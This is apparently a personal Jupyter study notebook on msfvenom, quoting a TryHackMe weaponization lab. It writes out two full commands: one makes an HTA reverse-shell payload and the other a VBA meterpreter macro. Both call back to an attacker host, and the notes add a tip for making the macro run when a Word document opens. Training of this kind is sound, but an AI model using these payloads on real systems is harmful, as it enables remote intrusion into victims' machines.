#!/usr/bin/env python
# coding: utf-8

# # Msfvenom
# 
# A component of Metasploit, this software can be used to create payloads.
# 
# 

# ## Create a HTA payload
# An HTA payload is a HTML application, which is a standalone web page.<br>
# The example below is from https://tryhackme.com/room/weaponization.<br>
# > msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerIP] LPORT=443 -f hta-psh -o thm.hta
# 
# <hr>

# ## Create a VBA Payload
# Again, from the same page, a VBA payload.
# > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
# 
# One thing on this. By default, this will create a macro for Excel (you'll see a Workbook_Open), change this to Document_Open
# 
# <hr>
